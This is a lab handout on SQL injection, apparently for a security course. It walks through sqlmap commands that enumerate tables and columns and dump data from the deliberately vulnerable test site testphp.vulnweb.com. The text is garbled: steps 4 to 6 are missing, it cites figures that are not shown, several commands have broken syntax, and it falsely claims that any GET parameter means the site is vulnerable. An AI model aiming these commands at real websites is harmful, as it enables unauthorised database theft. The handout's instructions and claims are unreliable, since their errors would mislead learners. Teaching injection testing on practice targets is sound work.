

Aim: Practical on injecting Code in Data Driven Applications: SQL Injection.
Lab Objectives:

Test a website for SQL Injection Vulnerability
Lab Environment:
1. Administrative privileges
2. Web browser with Internet connection
3. Kali linux
Implementation:
1. Log in to Kali Linux
2. Open a web browser and enter the URL of the website you want to exploit, as shown in
figure If a URL, for example 

http://testphp.vulnweb.com/listproducts.php?cat=1,

has a GET parameter as cat=1, then it is vulnerable to SQL injection attack
3. You check is your website is vulnerable by replacing the value=1 with * in GET
parameter. If the website result in an error as shown in figure, then it is vulnerable
In output part3, you can see the executed payloads, available databases and backend database
version
7. Type the following command and press enter to list information about tables present in a
particular database, as shown in figure


sudo su
sqlmap-u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart --tables


In figure 6b you can see that there are eight tables.
8. Type the following command and press enter to list information about the column
of a particular table, as shown in figure 7a

sqlmap-u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists -columns

9. Type the following command and press enter to dump the data from the column,
as shown in figure 8a

sqlmap-u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T artists-C aname -dump

figure 8a and 8b displays the output
